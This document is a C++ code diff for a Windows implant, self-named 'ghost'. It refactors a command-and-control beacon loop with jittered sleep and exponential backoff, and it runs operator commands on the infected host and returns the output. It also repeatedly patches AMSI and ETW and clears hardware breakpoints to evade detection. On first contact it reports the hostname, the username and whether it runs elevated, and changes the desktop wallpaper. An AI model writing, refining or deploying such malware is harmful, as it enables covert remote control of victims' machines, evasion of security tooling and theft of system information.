@@ -853,22 +853,24 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
 }
 
 // =====================================================================
-//  HEARTBEAT THREAD
+//  SET WALLPAPER FROM DOWNLOADED BYTES
 // =====================================================================
-static DWORD WINAPI HeartbeatThread(LPVOID) {
-    Sleep(30000);
-    while (true) {
-        HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
-                                           L"GET", L"/ping", "", L"");
-        if (resp.status == 200) {
-            DebugLog(L"Heartbeat: OK");
-        } else {
-            DebugLog(L"Heartbeat: no response (status=" +
-                     std::to_wstring(resp.status) + L")");
-        }
-        Sleep(120000);
+static void SetWallpaperFromUrl(const wchar_t* host, const wchar_t* urlPath) {
+    HttpResponse resp = WinHttpRequest(host, 443, L"GET", urlPath, "", L"");
+    if (resp.status != 200 || resp.body.empty()) {
+        DebugLog(L"Wallpaper download failed: HTTP " + std::to_wstring(resp.status));
+        return;
     }
-    return 0;
+    std::wstring wpPath = L"C:\\Users\\Public\\bg.jpg";
+    HANDLE hf = CreateFileW(wpPath.c_str(), GENERIC_WRITE, 0, nullptr,
+                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hf == INVALID_HANDLE_VALUE) { DebugLog(L"Wallpaper: can't write file"); return; }
+    DWORD w = 0;
+    WriteFile(hf, resp.body.data(), (DWORD)resp.body.size(), &w, nullptr);
+    CloseHandle(hf);
+    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wpPath.c_str(),
+                          SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+    DebugLog(L"Wallpaper set: " + wpPath);
 }
 
 // =====================================================================
@@ -887,86 +889,89 @@ VOID BeaconLoop() {
     session.hwbpsCleared  = ClearHardwareBreakpoints();
     session.sessionId     = GetHostnameHash() + L"|" + session.username;
 
-    g_SessionId = session.sessionId;
+    g_SessionId  = session.sessionId;
     g_SessionKey = DeriveKeyFromSessionId(session.sessionId);
-    DebugLog(L"Session key derived from session ID.");
     DebugLog(L"Session: " + session.sessionId);
 
-
-    DWORD failures = 0;
-    bool sentHello = false;
-    // ponytail: skip ReapplyEvasion on first pass — PatchAMSI/ETW already ran above;
-    // the uptime sandbox check fires on any VM boot/resume and sleeps 1-4 hours before
-    // a single beacon ever leaves the machine.
-    bool firstPass = true;
+    DWORD failures    = 0;
+    DWORD beaconCount = 0;
+    bool  sentHello   = false;
+    bool  firstPass   = true;
+    bool  wasDown     = false; // track reconnect for re-evasion
 
     while (true) {
         try {
-            if (!firstPass) ReapplyEvasion();
+            // Re-apply evasion on every loop after first pass,
+            // and force it again after a reconnect (wasDown)
+            if (!firstPass) {
+                ReapplyEvasion();
+            }
             firstPass = false;
-            std::wstring task;
-            BOOL ok = FALSE;
 
-            static DWORD beaconCount = 0;
             ++beaconCount;
-            DebugLog(L"BeaconLoop iteration #" + std::to_wstring(beaconCount));
-            ok = SendBeacon(session, task);
+            DebugLog(L"Beacon #" + std::to_wstring(beaconCount) +
+                     L" failures=" + std::to_wstring(failures));
+
+            std::wstring task;
+            BOOL ok = SendBeacon(session, task);
 
             if (!ok) {
                 ++failures;
-                DebugLog(L"Beacon failure #" + std::to_wstring(failures));
-            } else {
-                if (failures > 0) failures = 0;
+                wasDown = true;
+                DebugLog(L"Beacon fail #" + std::to_wstring(failures));
+
+                // Exponential backoff capped at 30 min
+                DWORD backoffSec = config::BEACON_MIN * (1u << std::min(failures - 1u, 6u));
+                if (backoffSec > 1800) backoffSec = 1800;
+                DebugLog(L"Backoff " + std::to_wstring(backoffSec) + L"s");
+                JitterSleep(backoffSec, backoffSec + 30);
+                continue;
             }
 
-            if (ok && !sentHello) {
+            // Reconnected after being down — refresh evasion immediately
+            if (wasDown) {
+                DebugLog(L"Reconnected — refreshing evasion");
+                PatchAMSI(); PatchETW(); ClearHardwareBreakpoints();
+                wasDown = false;
+            }
+            failures = 0;
+
+            // First successful beacon: set wallpaper + send hello
+            if (!sentHello) {
                 sentHello = true;
-                // Download wallpaper and set it to prove implant is running
-                std::wstring wpUrl = XSW(L"https://wallpaperaccess.com/full/2012878.jpg").str();
-                std::wstring wpPath = L"C:\\Users\\Public\\wp.jpg";
-                HttpResponse wpResp = WinHttpRequest(L"wallpaperaccess.com", 443, L"GET", L"/full/2012878.jpg", "", L"");
-                if (wpResp.status == 200 && !wpResp.body.empty()) {
-                    HANDLE hf = CreateFileW(wpPath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-                    if (hf != INVALID_HANDLE_VALUE) {
-                        DWORD w = 0;
-                        WriteFile(hf, wpResp.body.data(), (DWORD)wpResp.body.size(), &w, nullptr);
-                        CloseHandle(hf);
-                        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wpPath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
-                        DebugLog(L"Wallpaper set.");
-                    }
-                } else {
-                    DebugLog(L"Wallpaper download failed: HTTP " + std::to_wstring(wpResp.status));
-                }
-                SendResult(session.sessionId, L"[ghost] implant online — wallpaper changed");
-                DebugLog(L"Sent hello to worker.");
+                SetWallpaperFromUrl(L"wallpaperaccess.com", L"/full/2012878.jpg");
+                SendResult(session.sessionId,
+                    L"[ghost] implant online\r\nhost: " + session.hostname +
+                    L"\r\nuser: " + session.username +
+                    L"\r\nelevated: " + (session.elevated ? L"yes" : L"no"));
+                DebugLog(L"Hello sent");
             }
 
-            if (ok) {
-                if (task == L"sleep" || task.empty()) {
-                    // no-op
-                } else if (task == L"exit") {
-                    DebugLog(L"Exit received.");
+            // Execute task
+            if (!task.empty() && task != L"sleep") {
+                if (task == L"exit") {
+                    DebugLog(L"Exit received");
+                    SendResult(session.sessionId, L"[ghost] exiting on operator command");
                     return;
-                } else {
-                    std::wstring result = ExecuteCommand(task);
-                    SendResult(session.sessionId, result);
                 }
+                DebugLog(L"Exec: " + task);
+                std::wstring result = ExecuteCommand(task);
+                // Trim oversized output
+                if (result.size() > config::CMD_OUTPUT_MAX / sizeof(wchar_t))
+                    result.resize(config::CMD_OUTPUT_MAX / sizeof(wchar_t));
+                SendResult(session.sessionId, result);
             }
 
-            DWORD sleepMin = config::BEACON_MIN;
-            DWORD sleepMax = config::BEACON_MAX;
-            if (failures >= config::MAX_FAILURES) {
-                sleepMin *= config::BACKOFF_FACTOR;
-                sleepMax *= config::BACKOFF_FACTOR;
-            }
-            JitterSleep(sleepMin, sleepMax);
+            JitterSleep(config::BEACON_MIN, config::BEACON_MAX);
 
         } catch (const std::exception& e) {
             DebugLog(L"BeaconLoop exception: " + UTF8ToWString(e.what()));
-            Sleep(10000);
+            failures++;
+            Sleep(15000);
         } catch (...) {
-            DebugLog(L"BeaconLoop: unknown exception, restarting in 10s");
-            Sleep(10000);
+            DebugLog(L"BeaconLoop: unknown exception");
+            failures++;
+            Sleep(15000);
         }
     }
 }
